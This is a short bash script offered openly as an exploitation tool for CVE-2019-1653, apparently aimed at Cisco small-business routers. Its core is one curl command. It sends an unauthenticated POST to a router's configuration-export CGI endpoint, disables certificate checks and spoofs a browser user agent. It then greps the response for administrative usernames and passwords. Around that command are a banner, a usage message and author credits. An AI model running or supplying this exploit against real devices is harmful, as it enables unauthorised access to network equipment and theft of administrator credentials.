#!/bin/bash
#
# "We're here to observe another kind of code. The bad code." - Root, Person of Interest
#

IP=$1
echo ""
echo ""
echo "  ____ _              ____        _ _ _
 / ___(_)___  ___ ___/ ___| _ __ (_) | |
| |   | / __|/ __/ _ \___ \| '_ \| | | |
| |___| \__ \ (_| (_) |__) | |_) | | | |
 \____|_|___/\___\___/____/| .__/|_|_|_|
                           |_| "
echo "--------------------------------------------"

echo "An exploitation tool to extract password Information using CVE-2019-1653."

echo "by Shahee Mirza ## Twitter: @shaheemirza"

echo "Thanks to RedTeam Pentesting GmbH"

echo "--------------------------------------------"

if [ -z "$IP" ]
then
echo "++++++++++++++++++++++++++++++++++++++++++++"
      echo "USES: ./ciscospill.sh IP"
      echo "E.G.: ./ciscospill.sh 192.168.1.1"
echo "++++++++++++++++++++++++++++++++++++++++++++"
exit
fi

echo ""

echo "Exploiting: $IP"

echo ""

echo "++++++++++++++++++++++++++++++++++++++++++++"

echo "Administrative Password Information:"

echo "++++++++++++++++++++++++++++++++++++++++++++"

echo ""
curl -s -k -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -X POST --data 'submitbkconfig=0' 'https://'$IP'/cgi-bin/config.exp' 2>&1 | grep 'user \|password '

echo ""

echo "--------------------------------------------"

echo ""
